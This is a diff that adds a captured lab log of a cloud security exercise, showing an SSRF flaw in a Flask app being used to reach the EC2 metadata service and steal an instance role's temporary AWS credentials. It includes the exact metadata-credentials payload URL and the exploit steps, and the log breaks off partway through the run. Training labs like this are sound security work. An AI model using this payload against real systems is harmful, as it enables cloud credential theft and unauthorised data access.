@@ -1,3 +1,40 @@
+=== PathTriage Path 02 — IMDS SSRF Credential Theft ===
+Captured: 2026-06-13T06:23:29Z
+Operator:  moonhyeon@Hyeon.local
+
+--- Lab deployment evidence ---
+<<EOT
+Scenario 02: IMDS SSRF Credential Theft
+
+Starting position: network access to the vulnerable Flask app only
+                   (NO AWS credentials required to begin).
+Misconfiguration:  EC2 has IMDSv1 enabled (http_tokens = "optional")
+                   AND runs an app with an SSRF flaw (/fetch?url=).
+Target:            instance role (pathtriage-imds-instance-role),
+                   which holds AmazonS3ReadOnlyAccess.
+
+Exploit path:
+1. Hit /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+2. Read the role name, then fetch that role's temporary credentials
+3. Use the stolen AccessKey/Secret/Token with boto3
+4. Confirm via sts:GetCallerIdentity; demonstrate S3 read access
+
+App URL: http://13.236.186.60:5000
+
+EOT
+
+Target app URL: http://13.236.186.60:5000
+
+--- Pre-exploit credential context ---
+AWS_ACCESS_KEY_ID=<unset>
+AWS_PROFILE=<unset>
+(attacker begins with NO AWS credentials — only network reach)
+
+--- App reachability check ---
+Image preview service.
+Usage: /fetch?url=https://example.com/image.png
+
+--- Exploit run ---
 [*] Step 1: probing IMDS through the SSRF for an attached role
     [+] role discovered via metadata service: pathtriage-imds-instance-role
 [*] Step 2: exfiltrating temporary credentials for the role
